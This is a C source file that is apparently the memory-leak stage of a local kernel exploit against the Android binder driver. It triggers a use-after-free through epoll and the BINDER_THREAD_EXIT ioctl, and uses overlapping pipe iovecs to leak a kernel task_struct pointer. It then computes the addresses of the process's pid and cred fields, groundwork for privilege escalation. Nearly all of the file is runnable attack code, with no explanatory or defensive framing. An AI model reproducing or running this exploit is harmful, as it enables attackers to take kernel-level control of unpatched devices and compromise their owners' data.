
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdint.h>
#include <sched.h>
#include <ctype.h>

// global 
void *dummy_page;
static char pipe_read_buffer[PAGE_SIZE] = {0};
int nBytesRead = 0, nBytesWritten, binder_fd, epoll_fd, pipe_fd[2];
uint64_t task_struct_kptr, task_pid_kptr, task_cred_kptr;
struct epoll_event event = {.events = EPOLLIN};;



/**
 * Defines
 */
#define BINDER_THREAD_EXIT 0x40046208ul
#define IOVEC_SIZE 25
#define READ_PIPE pipe_fd[0]
#define WRITE_PIPE pipe_fd[1]


/* index equivalent to the iovec which overlaps the wait struct */
#define IOVEC_OVERLAP_INDEX 10

/**
 * @brief dump memory
 * 
 */
void hexdump_memory(unsigned char *buf, size_t byte_count) {
    unsigned long byte_offset_start = 0;
    if (byte_count % 16) {
        return ;
    }

    for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count; byte_offset += 16) {
        char line[1000];
        char *linep = line;
        linep += sprintf(linep, "%08lx   ", byte_offset);
        for (int i = 0; i < 16; i++) {
            linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
        }

        linep += sprintf(linep, "  |");
        for (int i = 0; i < 16; i++) {
            char c = buf[byte_offset + i];
            if (isalnum(c) || ispunct(c) || c == ' ') {
                *(linep++) = c;
            } else {
                *(linep++) = '.';
            }
        }
        linep += sprintf(linep, "|");
        puts(line);
    }
}

/**
 * @brief Bind to CPU
 * 
 * It's a good thing to bind the CPU to a specific core
 */
void bindToCPU() {
    int ret;
    cpu_set_t cpuSet;

    CPU_ZERO(&cpuSet);
    CPU_SET(0, &cpuSet);

    printf("[+] Bind to 0th core.\n");

    ret = sched_setaffinity(0, sizeof(cpu_set_t), &cpuSet);

    if (ret < 0) {
        printf("[-] bind CPU failed: 0x%x\n", errno);
    }
}

void leakTaskStruct() {
    struct iovec iovec_stack[IOVEC_SIZE] = {nullptr};

    /* step1 [vuln init] : 
     *  open the binder device
     *  create epoll
     *  link epoll     
     */
    printf("[+] Open /dev/binder\n");
    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) {
        printf("[-] Error : open binder driver failed.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t [*] binder_fd -> 0x%x\n", binder_fd);
    }

    printf("[+] Creating epoll\n");
    epoll_fd = epoll_create(0x41);
    if (epoll_fd < 0) {
        printf("[-] Error : create epoll fd failed.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t [*] create epoll fd succeed at 0x%x\n", epoll_fd);
    }

    printf("[+] Linking epoll\n");
    epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event);

    /**
     * step2 [pipe and iovec init]
     * 
     */
    printf("[+] Setting pipe");
    if (pipe(pipe_fd) == -1) {
        printf("\t[-] Error : unable to create pipe.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] create pipe successfully.\n");
    }

    printf("[+] Reducing the size of pipe to PAGE_SIZE.\n");
    if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) == -1) {
        printf("\t[-] Error : unable to change the pipe capacity.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] change the size of pipe success.\n");
    }

    printf("[+] Setting up iovecs\n");
    dummy_page = mmap((void *) 0x100000000ul, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (!dummy_page) {
        printf("\t[-] Error : unable to mmap 4GB aligned page\n");
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] Mapped page : %p\n", dummy_page);
    }

    iovec_stack[IOVEC_OVERLAP_INDEX].iov_base = dummy_page;
    iovec_stack[IOVEC_OVERLAP_INDEX].iov_len = PAGE_SIZE;
    iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_base = (void *) 0x41414141;
    iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;

    /**
     * step 3 : [trigge UAF and leak data at binder_thread + 0xa8]
     * 
     */
    pid_t child = fork();

    if (child == 0) {
        // child process
        sleep(2);
        printf("[+] Child process is weaking up and run.\n");

        // writes a kernel pointer to binder_thread->wait.head to
        // binder_thread->wait.head.next and binder_thread->wait.head.prev
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);

        // reading funk data
        nBytesRead = read(pipe_fd[0], pipe_read_buffer, sizeof(pipe_read_buffer));
        if (nBytesRead != PAGE_SIZE) {
            printf("\t[-] CHILD Error : read failed. nBytesRead : 0x%lx, expected : 0x%x\n", nBytesRead, PAGE_SIZE);
            exit(EXIT_FAILURE);
        }

        exit(EXIT_SUCCESS);
    }

    // parent process
    // trigge binder_thread free
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    nBytesWritten = writev(pipe_fd[1], iovec_stack, IOVEC_SIZE);
    if (nBytesWritten != PAGE_SIZE * 2) {
        printf("\t[-] Error : writev failed. nByteWritten : 0x%lx, expected: 0x:%x", nBytesWritten, PAGE_SIZE*2);
        exit(EXIT_FAILURE);
    } else {
        printf("\t[*] wrote 0x%lx bytes\n", nBytesWritten);
    }

    // useful kernel pointer leak here;
    nBytesRead = read(pipe_fd[0], pipe_read_buffer, sizeof(pipe_read_buffer));
    if (nBytesRead != PAGE_SIZE) {
        printf("\t[-] Error : read failed. nBytesRead: 0x%lx, excepted: 0x%x\n", nBytesRead, PAGE_SIZE);
        exit(EXIT_FAILURE);
    }

    // wait for child process to exit.
    wait(nullptr);

    hexdump_memory((unsigned char *) pipe_read_buffer, sizeof(pipe_read_buffer));

    task_struct_kptr = *(uint64_t *)(pipe_read_buffer + 0xE8);
    /**
     * @brief #define PIPE_READ_KPTR_OFFSET 0xE8
            #define TASK_STRUCT_PID_OFFSET 0x4E8
            #define TASK_STRUCT_CRED_OFFSET 0x688
     * 
     */
    task_pid_kptr = task_struct_kptr + 0x4E8;
    task_cred_kptr = task_struct_kptr + 0x688;

    printf("\t[+] leaked task_struct kernel pointer: 0x%lx\n", task_struct_kptr);
    printf("\t[+] task_struct->pid @ 0x%lx\n", task_pid_kptr);
    printf("\t[+] task_struct->cred @ 0x%lx\n", task_cred_kptr);
}

int main() {
    bindToCPU();
    leakTaskStruct();
    return EXIT_SUCCESS;
}